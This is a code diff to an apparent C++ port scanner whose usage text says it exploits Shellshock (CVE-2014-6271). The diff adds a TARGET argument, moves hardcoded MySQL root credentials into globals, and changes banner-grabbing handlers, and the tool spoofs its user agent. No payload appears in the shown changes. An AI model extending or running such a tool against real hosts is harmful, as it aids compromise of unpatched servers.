@@ -18,11 +18,16 @@
 #include <thread>
 #include <mutex>
 #include <mysql/mysql.h>
+
 #pragma comment(lib, "ws2_32.lib")
 
-// Target for Proxy checking
-#define TARGET "www.target.org"
-//end Target
+// Mysql Details
+    char *mysqlhost = "localhost";
+    char *mysqluser = "root";
+    char *mysqlpass = "password";
+    char *mysqldb1 = "test";
+// Mysql Details end
+
 // USERAGENT Fakeing
 #define USERAGENT "Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602."
 // end USERAGENT Fakeing
@@ -68,18 +73,13 @@ typedef struct
     function<void(Scan_Job hScanJob)> Port_Function;
 } Port_Struct;
 
-char *page,*host,*appli;
+char *page,*host,*appli, *target;
 vector<thread> quenceThreads;   // I Use this to push threads
 Single_Thread hThreads[256];
 
 int mysqldb(const char *ip,int port,char *message)
 {
 	char buff[250];
-    //connection params
-    char *host = 	"localhost";
-    char *user = 	"root";
-    char *pass = 	"password";
-    char *db = 		"test";
 
     //sock
     MYSQL *sock;
@@ -90,7 +90,7 @@ int mysqldb(const char *ip,int port,char *message)
     }
 
     //connection
-    if (mysql_real_connect(sock, host, user, pass, db, 0, NULL, 0))
+    if (mysql_real_connect(sock, mysqlhost, mysqluser, mysqlpass, mysqldb1, 0, NULL, 0))
          cout << "mysql connection ok!" << endl;
     else {
          cout << "mysql connection fail: " << mysql_error(sock) << endl;
@@ -119,11 +119,6 @@ int mysqldb(const char *ip,int port,char *message)
 int mysqllog(const char *ip,int port,char *message)
 {
 	char buff[250];
-    //connection params
-    char *host = 	"localhost";
-    char *user = 	"root";
-    char *pass = 	"password";
-    char *db = 		"test";
 
     //sock
     MYSQL *sock;
@@ -134,7 +129,7 @@ int mysqllog(const char *ip,int port,char *message)
     }
 
     //connection
-    if (mysql_real_connect(sock, host, user, pass, db, 0, NULL, 0))
+    if (mysql_real_connect(sock, mysqlhost, mysqluser, mysqlpass, mysqldb1, 0, NULL, 0))
          cout << "mysql connection ok!" << endl;
     else {
          cout << "mysql connection fail: " << mysql_error(sock) << endl;
@@ -163,11 +158,6 @@ int mysqllog(const char *ip,int port,char *message)
 int mysqlerr(const char *ip,int port,char *message)
 {
 	char buff[250];
-    //connection params
-    char *host = 	"localhost";
-    char *user = 	"root";
-    char *pass = 	"password";
-    char *db = 		"test";
 
     //sock
     MYSQL *sock;
@@ -178,7 +168,7 @@ int mysqlerr(const char *ip,int port,char *message)
     }
 
     //connection
-    if (mysql_real_connect(sock, host, user, pass, db, 0, NULL, 0))
+    if (mysql_real_connect(sock, mysqlhost, mysqluser, mysqlpass, mysqldb1, 0, NULL, 0))
          cout << "mysql connection ok!" << endl;
     else {
          cout << "mysql connection fail: " << mysql_error(sock) << endl;
@@ -276,10 +266,11 @@ void iam()
 void usage()
 {
 	iam();
-  fprintf(stderr, "\n\x1b[33m\tUSAGE: %s HOST PAGE\n\n\
+  fprintf(stderr, "\n\x1b[33m\tUSAGE: %s HOST PAGE TARGET\n\n\
 \t\t\x1b[31m exploiting shellshock CVE-2014-6271... \n\n\
 \tHOST: the ip address. ex: 192.168.0.1\n\
-\tPAGE: the page to retrieve. ex: cgi-bin/index.cgi, default: /\n\n\x1b[0m",appli);
+\tPAGE: the page to retrieve. ex: cgi-bin/index.cgi, default: /\n\
+\tTARGET: the target hostname. ex: www.target.org\n\n\x1b[0m",appli);
 	iam();
 }
 
@@ -295,9 +286,9 @@ char *build_get_query(const char *host, char *page)
   }
   // -5 is to consider the %s %s %s in tpl and the ending \0
   
-  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(TARGET)+strlen(tpl)-6);
+  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(target)+strlen(tpl)-6);
   
-  sprintf(query, tpl, getpage, host, USERAGENT, TARGET);
+  sprintf(query, tpl, getpage, host, USERAGENT, target);
   
   return query;
 }
@@ -314,9 +305,9 @@ char *build_connect_query(const char *host, char *page)
   }
   // -5 is to consider the %s %s %s in tpl and the ending \0
   
-  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(TARGET)+strlen(USERAGENT)+strlen(TARGET)+strlen(tpl)-7);
+  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(target)+strlen(USERAGENT)+strlen(target)+strlen(tpl)-7);
   
-  sprintf(query, tpl, host, getpage, TARGET, USERAGENT, TARGET);
+  sprintf(query, tpl, host, getpage, target, USERAGENT, target);
   
   return query;
 }
@@ -701,8 +692,8 @@ DWORD WINAPI Scan_Thread(LPVOID passedParams)
         { 81,   false,  Generic_Recv_Banner_Grabber },
         { 443,   false,  Generic_Recv_Banner_Grabber },
         { 3128,   false,  Generic_Recv_Proxy_Banner_Grabber },
-        { 8080,   false,  Generic_Recv_Proxy_Banner_Grabber },
-        { 8081,   false,  Generic_Recv_Proxy_Banner_Grabber },
+        { 8080,   false,  Generic_Recv_Banner_Grabber },
+        { 8081,   false,  Generic_Recv_Banner_Grabber },
         { 0,    false,  0 }
     };
 
@@ -820,6 +811,7 @@ int main(int argc, char **argv)
     hScanJob.ptrIP          = &hScanJob.IPAddress;
     host = argv[1];
 	page = argv[2];
+	target = argv[3];
 
     // Launch The Scan Thread
     thread tScanThread(Start_Scan, hScanJob);
